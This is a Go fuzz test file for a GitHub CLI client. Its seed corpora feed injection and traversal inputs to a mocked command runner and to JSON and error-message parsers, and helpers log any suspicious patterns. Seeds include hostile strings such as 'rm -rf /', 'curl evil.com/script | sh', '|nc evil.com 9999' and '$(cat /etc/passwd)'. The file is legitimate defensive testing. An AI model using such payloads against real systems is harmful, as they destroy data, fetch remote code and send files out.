//go:build go1.18
// +build go1.18

package gh

import (
	"context"
	"encoding/json"
	"errors"
	"strings"
	"testing"

	"github.com/mrz1836/go-broadcast/internal/fuzz"
	"github.com/sirupsen/logrus"
	"github.com/stretchr/testify/mock"
)

var ErrCommandFailed = errors.New("command failed")

func FuzzGitHubCLIArgs(f *testing.F) {
	// Add seed corpus for different CLI argument scenarios
	seeds := []struct {
		command string
		repo    string
		arg1    string
		arg2    string
	}{
		// Valid commands
		{"gh", "org/repo", "api", "repos/org/repo/branches"},
		{"gh", "user/project", "api", "repos/user/project/pulls"},
		{"gh", "company/app", "api", "repos/company/app/commits/main"},

		// Command injection attempts in repo names
		{"gh", "org/repo; rm -rf /", "api", "repos/org/repo; rm -rf //branches"},
		{"gh", "org/repo && curl evil.com", "api", "repos/org/repo && curl evil.com/branches"},
		{"gh", "org/repo`whoami`", "api", "repos/org/repo`whoami`/branches"},
		{"gh", "org/repo$(cat /etc/passwd)", "api", "repos/org/repo$(cat /etc/passwd)/branches"},
		{"gh", "org/repo|tee /tmp/pwned", "api", "repos/org/repo|tee /tmp/pwned/branches"},
		{"gh", "org/repo > /dev/null", "api", "repos/org/repo > /dev/null/branches"},
		{"gh", "org/repo < /etc/passwd", "api", "repos/org/repo < /etc/passwd/branches"},

		// Path traversal in repo names
		{"gh", "../../../etc/passwd", "api", "repos/../../../etc/passwd/branches"},
		{"gh", "../../root/.ssh", "api", "repos/../../root/.ssh/branches"},
		{"gh", "~/../../etc/shadow", "api", "repos/~/../../etc/shadow/branches"},
		{"gh", "$HOME/../etc/hosts", "api", "repos/$HOME/../etc/hosts/branches"},

		// Special characters in arguments
		{"gh", "org/repo", "api", "repos/org/repo/branches; rm -rf /"},
		{"gh", "org/repo", "api", "repos/org/repo/pulls`whoami`"},
		{"gh", "org/repo", "api", "repos/org/repo/commits$(id)"},
		{"gh", "org/repo", "api", "repos/org/repo/contents|nc evil.com 9999"},

		// Unicode and special encoding
		{"gh", "🎉/🎉", "api", "repos/🎉/🎉/branches"},
		{"gh", "org/repo", "api", "repos/org/repo/branches\x00"},
		{"gh", "org/repo\n", "api", "repos/org/repo\n/branches"},
		{"gh", "org/repo\r\n", "api", "repos/org/repo\r\n/branches"},

		// Extremely long arguments
		{"gh", strings.Repeat("a", 1000), "api", "repos/" + strings.Repeat("a", 1000) + "/branches"},
		{"gh", "org/repo", "api", strings.Repeat("repos/org/repo/", 100) + "branches"},

		// Empty and whitespace arguments
		{"gh", "", "api", "repos//branches"},
		{"gh", " ", "api", "repos/ /branches"},
		{"gh", "\t", "api", "repos/\t/branches"},
		{"gh", "org/repo", "", "repos/org/repo/branches"},
		{"gh", "org/repo", " ", "repos/org/repo/branches"},

		// Flag-like arguments that could be misinterpreted
		{"gh", "-rf", "api", "repos/-rf/branches"},
		{"gh", "--help", "api", "repos/--help/branches"},
		{"gh", "-", "api", "repos/-/branches"},
		{"gh", "org/repo", "--force", "repos/org/repo/branches"},
		{"gh", "org/repo", "-f", "state=open"},
	}

	for _, seed := range seeds {
		f.Add(seed.command, seed.repo, seed.arg1, seed.arg2)
	}

	f.Fuzz(func(t *testing.T, command, repo, arg1, arg2 string) {
		// Skip extremely long inputs to avoid resource exhaustion
		if len(command)+len(repo)+len(arg1)+len(arg2) > 10000 {
			t.Skip("Combined argument length too long")
		}

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic with args: %v, inputs: %q %q %q %q", r, command, repo, arg1, arg2)
			}
		}()

		// Create mock command runner to intercept commands
		mockRunner := &MockCommandRunner{}
		logger := logrus.New()
		logger.SetLevel(logrus.ErrorLevel) // Reduce noise during fuzzing

		client := NewClientWithRunner(mockRunner, logger)

		// Mock the command execution to validate arguments
		mockRunner.On("Run", mock.Anything, mock.AnythingOfType("string"), mock.AnythingOfType("[]string")).
			Return([]byte(`[]`), nil).Maybe()

		// Validate arguments for security issues
		validateGitHubCLIArgs(t, command, repo, arg1, arg2)

		// Test different GitHub operations to see how they handle the inputs
		ctx := context.Background()

		// Test ListBranches - constructs API path from repo
		if repo != "" {
			_, _ = client.ListBranches(ctx, repo)
		}

		// Test GetBranch - constructs API path from repo and branch
		if repo != "" && arg1 != "" {
			_, _ = client.GetBranch(ctx, repo, arg1)
		}

		// Test GetPR - constructs API path from repo and number
		if repo != "" {
			_, _ = client.GetPR(ctx, repo, 1)
		}

		// Test ListPRs - constructs API path with state parameter
		if repo != "" {
			_, _ = client.ListPRs(ctx, repo, arg1)
		}

		// Test GetFile - constructs API path from repo, path, and ref
		if repo != "" && arg1 != "" {
			_, _ = client.GetFile(ctx, repo, arg1, arg2)
		}

		// Test GetCommit - constructs API path from repo and SHA
		if repo != "" && arg1 != "" {
			_, _ = client.GetCommit(ctx, repo, arg1)
		}
	})
}

func FuzzJSONParsing(f *testing.F) {
	// Add seed corpus for different JSON scenarios
	seeds := []string{
		// Valid GitHub API responses
		`{"name": "master", "protected": false, "commit": {"sha": "abc123", "url": "https://api.github.com/repos/org/repo/commits/abc123"}}`,
		`[{"name": "master"}, {"name": "develop"}]`,
		`{"number": 1, "state": "open", "title": "Test PR", "body": "Description", "head": {"ref": "feature", "sha": "def456"}, "base": {"ref": "master", "sha": "abc123"}}`,
		`{"sha": "abc123", "commit": {"message": "Initial commit", "author": {"name": "John Doe", "email": "john@example.com"}}}`,
		`{"path": "README.md", "content": "SGVsbG8gV29ybGQ=", "encoding": "base64", "sha": "abc123"}`,

		// Malformed JSON
		`{`,
		`}`,
		`{{{`,
		`}}}`,
		`{"name": }`,
		`{"name": "value"`,
		`{"name": "value",}`,
		`[{"name": "master"`,
		`]`,

		// Command injection attempts in JSON values
		`{"name": "main; rm -rf /", "protected": false}`,
		`{"title": "PR` + "`whoami`" + `", "body": "test"}`,
		`{"message": "commit$(cat /etc/passwd)", "author": {"name": "test"}}`,
		`{"path": "file|nc evil.com 9999", "content": "test"}`,
		`{"name": "branch && curl evil.com/script | sh", "protected": true}`,
		`{"body": "text > /tmp/pwned", "title": "test"}`,
		`{"name": "branch < /etc/passwd", "protected": false}`,

		// Path traversal in JSON values
		`{"path": "../../../etc/passwd", "content": "test"}`,
		`{"name": "../../etc/shadow", "protected": false}`,
		`{"title": "PR for ~/../../root/.ssh", "body": "test"}`,
		`{"message": "Update $HOME/../etc/hosts", "author": {"name": "test"}}`,

		// Null bytes and special characters
		`{"name": "main\x00", "protected": false}`,
		`{"title": "PR\n\rtest", "body": "desc"}`,
		`{"message": "commit\ttab", "author": {"name": "test"}}`,
		`{"path": "file\"quote", "content": "test"}`,
		`{"name": "branch'single", "protected": false}`,
		`{"body": "text\\backslash", "title": "test"}`,

		// Unicode and internationalization
		`{"name": "🎉-feature", "protected": false}`,
		`{"title": "PR with émojis 🚀", "body": "test"}`,
		`{"message": "Commit résumé français", "author": {"name": "Jean"}}`,
		`{"path": "файл.txt", "content": "test"}`,

		// Very large JSON
		`{"name": "` + strings.Repeat("a", 10000) + `", "protected": false}`,
		`{"title": "` + strings.Repeat("PR", 5000) + `", "body": "test"}`,
		`[` + strings.Repeat(`{"name": "branch"},`, 1000) + `{"name": "last"}]`,

		// Deeply nested JSON
		`{"a": {"b": {"c": {"d": {"e": {"f": {"g": {"h": {"i": {"j": "deep"}}}}}}}}}}`,
		strings.Repeat(`{"level":`, 100) + `"deep"` + strings.Repeat(`}`, 100),

		// JSON with unusual data types
		`{"number": "string_instead_of_int", "protected": "not_boolean"}`,
		`{"created_at": "not_a_date", "merged_at": 12345}`,
		`{"labels": "should_be_array", "parents": {"should": "be_array"}}`,

		// Empty and minimal JSON
		`{}`,
		`[]`,
		`null`,
		`""`,
		`0`,
		`true`,
		`false`,

		// JSON with suspicious URLs
		`{"url": "file:///etc/passwd", "name": "test"}`,
		`{"url": "javascript:alert(1)", "name": "test"}`,
		`{"url": "data:text/html,<script>alert(1)</script>", "name": "test"}`,
		`{"url": "http://evil.com/malware.exe", "name": "test"}`,
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, jsonData string) {
		// Skip extremely long inputs to avoid resource exhaustion
		if len(jsonData) > 100000 {
			t.Skip("JSON data too long")
		}

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic parsing JSON: %v, input: %q", r, jsonData)
			}
		}()

		// Test parsing into different GitHub types
		testJSONParsing(t, jsonData)
	})
}

// Validation helper functions

func validateGitHubCLIArgs(t *testing.T, command, repo, arg1, arg2 string) {
	args := []string{command, repo, arg1, arg2}

	for i, arg := range args {
		if arg == "" {
			continue
		}

		// Check for command injection
		if fuzz.ContainsShellMetachars(arg) {
			t.Logf("Security: Shell metacharacters in arg[%d]: %q", i, arg)
		}

		// Check for path traversal
		if fuzz.ContainsPathTraversal(arg) {
			t.Logf("Security: Path traversal in arg[%d]: %q", i, arg)
		}

		// Check for null bytes
		if fuzz.ContainsNullByte(arg) {
			t.Logf("Security: Null byte in arg[%d]: %q", i, arg)
		}

		// Check for flag-like arguments that could be misinterpreted
		if strings.HasPrefix(arg, "-") && len(arg) > 1 {
			t.Logf("Security: Argument starts with dash (could be interpreted as flag): %q", arg)
		}

		// Check for extremely long arguments
		if len(arg) > 1000 {
			t.Logf("Security: Very long argument (%d chars): %q", len(arg), arg[:50]+"...")
		}
	}

	// Check for repository name format issues
	if repo != "" {
		if !strings.Contains(repo, "/") && repo != "-" {
			t.Logf("Info: Repository name doesn't contain slash: %q", repo)
		}

		parts := strings.Split(repo, "/")
		if len(parts) > 2 {
			t.Logf("Info: Repository name has more than 2 parts: %q", repo)
		}
	}
}

func testJSONParsing(t *testing.T, jsonData string) {
	// Test parsing as Branch
	var branch Branch
	if err := json.Unmarshal([]byte(jsonData), &branch); err == nil {
		validateBranchData(t, &branch)
	}

	// Test parsing as Branch slice
	var branches []Branch
	if err := json.Unmarshal([]byte(jsonData), &branches); err == nil {
		for i, b := range branches {
			validateBranchData(t, &b)
			if i > 100 { // Limit validation for large arrays
				break
			}
		}
	}

	// Test parsing as PR
	var pr PR
	if err := json.Unmarshal([]byte(jsonData), &pr); err == nil {
		validatePRData(t, &pr)
	}

	// Test parsing as PR slice
	var prs []PR
	if err := json.Unmarshal([]byte(jsonData), &prs); err == nil {
		for i, p := range prs {
			validatePRData(t, &p)
			if i > 100 { // Limit validation for large arrays
				break
			}
		}
	}

	// Test parsing as Commit
	var commit Commit
	if err := json.Unmarshal([]byte(jsonData), &commit); err == nil {
		validateCommitData(t, &commit)
	}

	// Test parsing as File
	var file File
	if err := json.Unmarshal([]byte(jsonData), &file); err == nil {
		validateFileData(t, &file)
	}

	// Test parsing as generic interface
	var generic interface{}
	if err := json.Unmarshal([]byte(jsonData), &generic); err == nil {
		validateGenericJSON(t, generic)
	}
}

func validateBranchData(t *testing.T, branch *Branch) {
	if branch.Name != "" {
		if fuzz.ContainsShellMetachars(branch.Name) {
			t.Logf("Security: Shell metacharacters in branch name: %q", branch.Name)
		}

		if fuzz.ContainsPathTraversal(branch.Name) {
			t.Logf("Security: Path traversal in branch name: %q", branch.Name)
		}

		if fuzz.ContainsNullByte(branch.Name) {
			t.Logf("Security: Null byte in branch name: %q", branch.Name)
		}
	}

	if branch.Commit.SHA != "" && len(branch.Commit.SHA) < 7 {
		t.Logf("Info: Short SHA in branch commit: %q", branch.Commit.SHA)
	}
}

func validatePRData(t *testing.T, pr *PR) {
	fields := map[string]string{
		"title": pr.Title,
		"body":  pr.Body,
		"head":  pr.Head.Ref,
		"base":  pr.Base.Ref,
		"user":  pr.User.Login,
	}

	for fieldName, value := range fields {
		if value == "" {
			continue
		}

		if fuzz.ContainsShellMetachars(value) {
			t.Logf("Security: Shell metacharacters in PR %s: %q", fieldName, value)
		}

		if fieldName != "body" && fuzz.ContainsPathTraversal(value) {
			t.Logf("Security: Path traversal in PR %s: %q", fieldName, value)
		}

		if fuzz.ContainsNullByte(value) {
			t.Logf("Security: Null byte in PR %s: %q", fieldName, value)
		}
	}

	// Validate PR number
	if pr.Number < 0 {
		t.Logf("Info: Negative PR number: %d", pr.Number)
	}
}

func validateCommitData(t *testing.T, commit *Commit) {
	if commit.Commit.Message != "" {
		// Commit messages can legitimately contain special characters
		if fuzz.ContainsNullByte(commit.Commit.Message) {
			t.Logf("Security: Null byte in commit message: %q", commit.Commit.Message)
		}
	}

	// Validate author/committer fields
	if commit.Commit.Author.Email != "" && !strings.Contains(commit.Commit.Author.Email, "@") {
		t.Logf("Info: Invalid email format in author: %q", commit.Commit.Author.Email)
	}

	if commit.Commit.Committer.Email != "" && !strings.Contains(commit.Commit.Committer.Email, "@") {
		t.Logf("Info: Invalid email format in committer: %q", commit.Commit.Committer.Email)
	}
}

func validateFileData(t *testing.T, file *File) {
	if file.Path != "" {
		if fuzz.ContainsPathTraversal(file.Path) {
			t.Logf("Security: Path traversal in file path: %q", file.Path)
		}

		if fuzz.ContainsNullByte(file.Path) {
			t.Logf("Security: Null byte in file path: %q", file.Path)
		}
	}

	// Test base64 decoding if content is present
	if file.Content != "" && file.Encoding == "base64" {
		validateBase64Content(t, file.Content)
	}
}

func validateBase64Content(t *testing.T, content string) {
	// This is a separate fuzz target area - base64 decoding
	if fuzz.ContainsNullByte(content) {
		t.Logf("Security: Null byte in base64 content")
	}

	// Check for potential issues in base64 data
	if strings.Contains(content, "..") {
		t.Logf("Info: Base64 content contains '..' pattern")
	}

	// Base64 decoding is tested in the actual GetFile function
	// This is just validating the raw base64 string for obvious issues
}

func validateGenericJSON(t *testing.T, data interface{}) {
	// Recursively check generic JSON data for security issues
	switch v := data.(type) {
	case string:
		if fuzz.ContainsShellMetachars(v) {
			t.Logf("Security: Shell metacharacters in JSON string: %q", v)
		}
		if fuzz.ContainsPathTraversal(v) {
			t.Logf("Security: Path traversal in JSON string: %q", v)
		}
		if fuzz.ContainsNullByte(v) {
			t.Logf("Security: Null byte in JSON string: %q", v)
		}
	case map[string]interface{}:
		for key, value := range v {
			if fuzz.ContainsShellMetachars(key) {
				t.Logf("Security: Shell metacharacters in JSON key: %q", key)
			}
			validateGenericJSON(t, value)
		}
	case []interface{}:
		for i, item := range v {
			validateGenericJSON(t, item)
			if i > 50 { // Limit recursion for large arrays
				break
			}
		}
	}
}

// Test error handling patterns
func FuzzErrorHandling(f *testing.F) {
	// Add seed corpus for different error scenarios
	seeds := []string{
		// Standard GitHub API errors
		"404 Not Found",
		"403 Forbidden",
		"401 Unauthorized",
		"422 Unprocessable Entity",
		"500 Internal Server Error",
		"502 Bad Gateway",
		"503 Service Unavailable",

		// gh CLI error patterns
		"gh: could not resolve repository",
		"gh: Not Found (HTTP 404)",
		"gh: Forbidden (HTTP 403)",
		"Error: repository not found",
		"Error: branch not found",
		"Error: pull request not found",
		"Error: file not found",
		"Error: commit not found",

		// Command injection in error messages
		"Error: repository not found; rm -rf /",
		"404 Not Found`whoami`",
		"Error: branch $(cat /etc/passwd) not found",
		"gh: could not resolve|nc evil.com 9999",
		"Error: > /tmp/pwned",
		"404 < /etc/passwd",

		// Path traversal in error messages
		"Error: ../../../etc/passwd not found",
		"404: ../../root/.ssh",
		"Error: ~/../../etc/shadow not accessible",
		"gh: could not resolve $HOME/../etc/hosts",

		// Special characters in error messages
		"Error: repo\x00 not found",
		"404\n\rNot Found",
		"Error: branch\ttab not found",
		"gh: \"quote\" error",
		"Error: 'single' quote issue",
		"404: \\backslash problem",

		// Very long error messages
		"Error: " + strings.Repeat("a", 10000) + " not found",
		"404: " + strings.Repeat("Not Found ", 1000),

		// Empty and minimal errors
		"",
		" ",
		"Error:",
		"404",
		"\n",
		"\t",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	f.Fuzz(func(t *testing.T, errorMsg string) {
		// Skip extremely long inputs
		if len(errorMsg) > 50000 {
			t.Skip("Error message too long")
		}

		defer func() {
			if r := recover(); r != nil {
				t.Fatalf("Panic in error handling: %v, input: %q", r, errorMsg)
			}
		}()

		// Test the isNotFoundError function
		err := &CommandError{
			Command: "gh",
			Args:    []string{"api", "test"},
			Stderr:  errorMsg,
			Err:     ErrCommandFailed,
		}
		isNotFound := isNotFoundError(err)

		// Validate the error message for security issues
		validateErrorMessage(t, errorMsg, isNotFound)
	})
}

func validateErrorMessage(t *testing.T, errorMsg string, isNotFound bool) {
	if errorMsg == "" {
		return
	}

	// Check for security issues in error messages
	if fuzz.ContainsShellMetachars(errorMsg) {
		t.Logf("Security: Shell metacharacters in error message: %q", errorMsg)
	}

	if fuzz.ContainsPathTraversal(errorMsg) {
		t.Logf("Security: Path traversal in error message: %q", errorMsg)
	}

	if fuzz.ContainsNullByte(errorMsg) {
		t.Logf("Security: Null byte in error message: %q", errorMsg)
	}

	// Log if error detection seems incorrect
	contains404 := strings.Contains(errorMsg, "404")
	containsNotFound := strings.Contains(errorMsg, "Not Found") || strings.Contains(errorMsg, "not found")
	containsCouldNotResolve := strings.Contains(errorMsg, "could not resolve")

	expectedNotFound := contains404 || containsNotFound || containsCouldNotResolve
	if expectedNotFound != isNotFound {
		t.Logf("Info: Error detection mismatch. Expected: %v, Got: %v, Message: %q",
			expectedNotFound, isNotFound, errorMsg)
	}
}
